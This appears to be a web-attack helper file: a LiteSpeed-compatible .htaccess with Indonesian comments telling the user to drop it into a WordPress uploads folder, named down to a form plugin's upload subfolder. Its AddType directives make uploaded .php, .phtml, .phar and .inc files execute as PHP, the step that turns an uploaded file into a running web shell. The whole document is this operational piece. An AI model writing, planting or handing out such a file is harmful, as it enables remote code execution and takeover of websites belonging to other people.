# language: Apache .htaccess (LiteSpeed-compatible)
# taruh di /wp-content/uploads/ atau /wp-content/uploads/wp-libre-form/
# LiteSpeed nggak baca php_flag/php_value — cuma AddType yang ngefek

<IfModule litespeed>
    # paksa file ini di-handle sebagai PHP, bukan static file
    AddType application/x-httpd-php .php .phtml .php5 .php7
    AddType application/x-httpd-php .phar .inc
</IfModule>
